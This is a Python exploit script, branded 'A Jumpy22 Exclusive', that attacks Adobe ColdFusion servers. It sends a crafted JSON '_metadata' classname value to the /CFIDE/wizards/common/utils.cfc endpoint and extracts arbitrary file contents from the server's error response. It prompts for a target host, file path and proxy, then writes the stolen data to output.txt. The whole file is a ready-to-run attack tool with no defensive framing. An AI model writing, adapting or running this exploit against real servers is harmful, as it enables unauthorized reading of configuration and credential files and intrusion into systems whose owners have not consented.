import sys
import requests
import json
import base64

BANNER = """
_________        .__       .___ _________        .__  .__                 
\_   ___ \  ____ |  |    __| _/ \_   ___ \_____  |  | |  |   ___________  
/    \  \/ /  _ \|  |   / __ |  /    \  \/\__  \ |  | |  | _/ __ \_  __ \ 
\     \___(  <_> )  |__/ /_/ |  \     \____/ __ \|  |_|  |_\  ___/|  | \/ 
 \______  /\____/|____/\____ |   \______  (____  /____/____/\___  >__|    
        \/                  \/          \/     \/               \/                                                                                                                                                                                                                                       
"""

RED_COLOR = "\033[91m"
GREEN_COLOR = "\032[42m"
RESET_COLOR = "\033[0m"

def print_banner():
    print(RED_COLOR + BANNER + "                  ~A Jumpy22 Exclusive~" + RESET_COLOR)
    return 0

def run(host, file, endpoint="/CFIDE/wizards/common/utils.cfc", proxy_url=None):
    if not endpoint.endswith('.cfc'):
        endpoint += '.cfc'

    if file.endswith('.cfc'):
        raise ValueError('The file must not point to a .cfc')

    targeted_file = f"a/{file}"
    json_variables = json.dumps({"_metadata": {"classname": targeted_file}, "_variables": []})

    vars_get = {'method': 'test', '_cfclient': 'true'}
    uri = f'{host}{endpoint}'

    response = requests.post(uri, params=vars_get, data={'_variables': json_variables}, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)

    file_data = None
    splatter = '<!-- " ---></TD></TD></TD></TH></TH></TH>'

    if response.status_code in [404, 500] and splatter in response.text:
        file_data = response.text.split(splatter, 1)[0]

    if file_data is None:
        raise ValueError('Failed to read the file. Ensure the CFC_ENDPOINT, CFC_METHOD, and CFC_METHOD_PARAMETERS are set correctly, and that the endpoint is accessible.')

    print(file_data)

    # Save the output to a file
    output_file_name = 'output.txt'
    with open(output_file_name, 'w') as output_file:
        output_file.write(file_data)
        print(f"The output saved to {output_file_name}")

if __name__ == "__main__":
    print_banner()
    host = input("Host: ")
    file = input("Target File: ")
    endpoint = input("Endpoint (/CFIDE/wizards/common/utils.cfc if blank): ")
    if endpoint == "":
    	endpoint = "/CFIDE/wizards/common/utils.cfc"
    proxy_url = input("Proxy (None if blank): ")
    if proxy_url == "":
    	proxy_url = None

    try:
        run(host, file, endpoint, proxy_url)
    except Exception as e:
        print(f"Error: {e}")